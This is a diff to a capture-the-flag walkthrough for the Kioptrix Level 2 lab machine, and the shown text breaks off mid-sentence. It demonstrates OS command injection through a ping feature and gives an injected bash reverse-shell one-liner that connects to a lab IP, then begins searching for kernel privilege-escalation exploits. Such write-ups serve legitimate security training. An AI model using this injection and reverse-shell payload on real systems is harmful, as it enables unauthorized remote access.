@@ -22,10 +22,15 @@
 - So it looks like its using the OS ping command, which we can try to command stack using   `;  &&  ||`  to get a reverse shell
 - Testing command stacking with the command `; id`
 ![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/id_test.png)
-
+----------
 - lets try a reverse shell using bash. `; bash -i >& /dev/tcp/10.0.2.6/443 0>&1`
 ![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/bash_code.png)
 ![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/bash_rev_shell.png)
 
+- wooo! success we have a shell on the machine! we are apache user with low privileges so lets try to get root.
+- from the previous image, we can see the kernal is 2.6.9-55. I usually like to look at the privileges the user has and what kernal version is running once i get access to the machine.
+- I used searchsploit to search "kernel 2.6"....and there was a ton of exploits that poped up. I decided to see if i can find the OS to help me narrow it down.
 
+
+- `uname -a` was not much help, so i looked at 
 
